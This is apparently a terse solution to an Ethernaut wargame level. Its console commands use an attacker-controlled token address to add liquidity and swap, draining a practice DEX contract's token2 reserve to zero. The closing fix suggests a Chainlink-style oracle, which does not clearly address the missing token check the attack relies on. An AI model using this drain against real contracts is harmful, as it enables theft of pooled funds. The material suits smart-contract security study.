// swap malicious token to token1/token2
// 1. approve the Dex contract in mat token.
// malicious token add_liquidity and swap token2/1
await contract.balanceOf(await contract.token2(), contract.address) -> 100
let mal = "0x0f236a7B667A88C73dCa7699dc5878eFa4d186b6"
await contract.add_liquidity(mal, 100)
await contract.get_swap_price(mal, await contract.token2(), 100)
await contract.swap(mal, await contract.token2(), 100)

// token2 drained
await contract.balanceOf(await contract.token2(), contract.address) -> 0
await contract.balanceOf(mal, contract.address)


// solved:
// need oracle caclate the token price from mulltiple source to guarantee the price is decentralized
// , such as Chainlink Data Feeds.


// reference: https://medium.com/@this_post/ethernaut-22-dex-writeups-55d4bfa8a7fa
